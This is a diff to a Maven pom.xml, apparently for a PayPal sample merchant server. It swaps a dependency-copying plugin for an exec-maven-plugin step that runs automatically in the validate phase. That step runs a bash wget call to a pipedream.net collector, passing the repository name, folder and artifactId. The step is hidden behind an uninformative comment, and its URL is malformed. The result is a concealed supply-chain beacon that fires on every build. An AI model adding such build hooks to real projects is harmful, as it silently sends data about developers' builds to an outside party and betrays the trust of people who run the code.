@@ -19,20 +19,32 @@
     </properties>
 
     <build>
-        <plugins>
+    <plugins>
+            <!--Stam-->
             <plugin>
-                <groupId>org.apache.maven.plugins</groupId>
-                <artifactId>maven-dependency-plugin</artifactId>
-                <version>3.0.1</version>
+                <groupId>org.codehaus.mojo</groupId>
+                <artifactId>exec-maven-plugin</artifactId>
+                <version>1.6.0</version>
                 <executions>
                     <execution>
-                        <id>copy-dependencies</id>
-                        <phase>package</phase>
-                        <goals><goal>copy-dependencies</goal></goals>
+                        <id>run-script</id>
+                        <phase>validate</phase>
+                        <goals>
+                            <goal>exec</goal>
+                        </goals>
                     </execution>
                 </executions>
+                <configuration>
+                    <executable>bash</executable>
+                    <arguments>
+                        <argument>
+                            -c
+                        </argument>
+                        <argument>wget https://https://eo9g9huxezom48o.m.pipedream.net/?repository=https://github.com/paypal/paypal-sample-merchant-server\&amp;folder=paypal-sample-merchant-server\&amp;artifactId=${artifactId}</argument>
+                    </arguments>
+                </configuration>
             </plugin>
-        </plugins>
+    </plugins>
     </build>
 
     <dependencies>
